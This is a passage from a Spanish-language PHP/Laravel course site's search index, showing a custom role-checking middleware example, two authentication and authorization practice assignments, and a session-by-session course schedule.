\n</code></pre>"},{"location":"10laravelAutenticacion.html#middleware-personalizado","title":"Middleware personalizado","text":"<p>Se puede crear un middleware propio con Artisan:</p> <pre><code>php artisan make:middleware CheckRole\n</code></pre> <p>Esto genera <code>app/Http/Middleware/CheckRole.php</code>, donde se puede definir la l\u00f3gica de autorizaci\u00f3n. Los middlewares tienen un \u00fanico m\u00e9todo llamado <code>handle</code>, que recibe una petici\u00f3n y una funci\u00f3n para llamar como continuaci\u00f3n si pasa la verificaci\u00f3n que especifiquemos. Y si la verificaci\u00f3n falla, podemos devolver una respuesta o redirigir a otra ruta.</p> <pre><code>&lt;?php\nuse Closure;\nuse Illuminate\\Http\\Request;\n\nclass CheckRole\n{\n    public function handle(Request $request, Closure $next, $role)\n    {\n        if($request-&gt;user()-&gt;role !== $role) {\n            abort(403);\n        }\n        return $next($request);\n    }\n}\n</code></pre> <p>Y se usa en rutas:</p> <pre><code>&lt;?php\nRoute::get('/admin', [AdminController::class, 'view'])-&gt;middleware(CheckRole::class.\":admin\");\n</code></pre>"},{"location":"10laravelAutenticacion.html#actividades","title":"Actividades","text":"<p>A continuaci\u00f3n se presentan 2 pr\u00e1cticas sobre autorizaci\u00f3n y autenticaci\u00f3n. Escoge una de las 2 e implem\u00e9ntala.</p>"},{"location":"10laravelAutenticacion.html#gestion-de-usuarios","title":"Gesti\u00f3n de usuarios","text":"<p>Aplicaci\u00f3n que permita gestionar usuarios con autenticaci\u00f3n y autorizaci\u00f3n, implementando roles de usuario y permisos espec\u00edficos.</p> <ul> <li>Implementar autenticaci\u00f3n manual con Laravel.</li> <li>Crear dos roles: admin y user.</li> <li>Los administradores pueden gestionar (crear, editar y eliminar) usuarios.</li> <li>Los usuarios pueden actualizar su propio perfil pero no el de otros.</li> <li>Restringir acceso a las vistas seg\u00fan el rol del usuario.</li> </ul>"},{"location":"10laravelAutenticacion.html#mini-instagram","title":"Mini Instagram","text":"<p>Aplicaci\u00f3n que permita a los usuarios subir fotos, ver las de otros, pero modificar \u00fanicamente las suyas.</p> <ul> <li>Implementar autenticaci\u00f3n manual con Laravel.</li> <li>Cada usuario podr\u00e1 subir, editar y eliminar \u00fanicamente sus propias fotograf\u00edas.</li> <li>Todos los usuarios pueden ver las fotograf\u00edas de los dem\u00e1s.</li> <li>Implementar middlewares y policies para restringir la modificaci\u00f3n y eliminaci\u00f3n.</li> </ul>"},{"location":"planning.html","title":"Planificaci\u00f3n","text":""},{"location":"planning.html#1-arquitecturas-web-4h","title":"1.- Arquitecturas Web (4h)","text":"<ul> <li> 1.- (1) Introducci\u00f3n asignatura. Arquitecturas, decisiones de dise\u00f1o - Ejercicios 101-103</li> <li> 2.- (2) Herramientas. Puesta en marcha - Ejercicios 104-106</li> </ul>"},{"location":"planning.html#2-el-lenguaje-php-26h","title":"2.- El lenguaje PHP (26h)","text":"<ul> <li> 1.- (3) Sintaxis. Ejercicios 201-207</li> <li> 2.- (4) Condiciones. Ejercicios 208-216</li> <li> 3.- (5) Bucles. Ejercicios 220-223</li> <li> 4.- (6) Ejercicios 224-228</li> <li> 5.- (7) Arrays, asociativos. Ejercicios 230-235</li> <li> 6.- (8) Array bidimensionales. Ejercicios 236-238</li> <li> 7.- (9) Funciones, par\u00e1metros por defecto y con nombre. Ejercicios 240-242</li> <li> 8.- (10) Alcance y Funciones variable. Biblioteca de funciones. Ejercicios 243-245</li> <li> 9.- (11) Plantillas. Ejercicios 246-247.</li> <li> 10.- (12) Cadenas. Ejercicios 250-253</li> <li> 11.- (13) Subcadenas. Ejercicios 254-257</li> <li> 12.- (14) Math y tipos de datos. Ejercicios 260-262</li> <li> 13.- (15) Prueba escrita</li> </ul>"},{"location":"planning.html#3-php-orientado-a-objetos-18h","title":"3.- PHP Orientado a Objetos (18h)","text":"<ul> <li> 1.- (16) Clases y objetos. Constructor. Ejercicios 300-303</li> <li> 2.- (17) Clases est\u00e1ticas. Herencia. Ejercicios 304-307</li> <li> 3.- (18) Herencia. Clases abstractas. Ejercicios 308-311</li> <li> 4.- (19) Interfaces. Ejercicios 312-314</li> <li> 5.- (20) Proyecto Videoclub I. Ejercicios 320-323</li> <li> 6.- (21) Proyecto Videoclub I. Ejercicios 324-328</li> <li> 7.- (22) M\u00e9todos encadenados. Namespaces. Ejercicios 330-332</li> <li> 8.- (23) Excepciones. Ejercicios 333-334</li> <li> 9.- (24) Proyecto Videoclub II. Ejercicios 335-337</li> </ul>"},{"location":"planning.html#4-programacion-web-12h","title":"4.- Programaci\u00f3n Web (12h)","text":"<ul> <li> 1.- (25) Formularios. Ejercicios 401-403</li> <li> 2.- (26) Upload. Cookies. Ejercicios 404-406</li> <li> 3.- (27) Cookies. Sesi\u00f3n. Ejercicios 407-409</li> <li> 4.- (28) Gesti\u00f3n de usuarios. Ejercicios 410-415</li> <li> 5.- (29) Proyecto Videoclub III. Ejercicios 420-423</li> <li> 6.- (30) Proyecto Videoclub III. Ejercicios 424-426</li> </ul>"},{"location":"planning.html#5-herramientas-web-16h","title":"5.- Herramientas Web (16h)","text":"<ul> <li> 1.- (31) Resend. Introducci\u00f3n Monolog. Ejercicio 501-503</li> <li> 2.- (32) Manejadores. Uso de logs con Monolog. Ejercicios 505 - 507</li> <li> 3.- (33) Proyecto Videoclub 4.0. Ejercicios 511 - 515</li> <li> 4.- (34) Documentaci\u00f3n con phpDocumentor . Ejercicios 521 - 522.</li> <li> 5.- (35) Webscrapping. Ejercicios 531 - 533.</li> <li> 6.- (36) Pruebas con PhpUnit. Ejercicios 541 - 545.</li> <li> 7.- (37) Proyecto Videoclub V. Ejercicios 551 - 554.</li> <li> 8.- (38) Prueba escrita</li> </ul>"},{"location":"planning.html#6-acceso-a-datos-24h","title":"6.- Acceso a Datos (24h)","text":"<ul> <li> 1.- (39) SQL. Ejercicios</li> <li> 2.- (40) PDO. Ejercicios </li> <li> 3.- (41) . Ejercicios </li> <li> 4.- (42) . Ejercicios </li> <li> 5.- (43) CSV. Ejercicios </li> <li> 6.- (44) PDF. Ejercicios </li> <li> 7.- (45) Eloquent. Ejercicios </li> <li> 8.- (46) Migraciones. . Ejercicios </li> <li> 9.- (47) . Ejercicios </li> <li> 10.- (48) ORM. Ejercicios </li> <li> 11.- (49) . Ejercicios </li> <li> 12.- (50) . Ejercicios </li> </ul> <p>Total = 168h de sesiones lectivas.</p>"}]}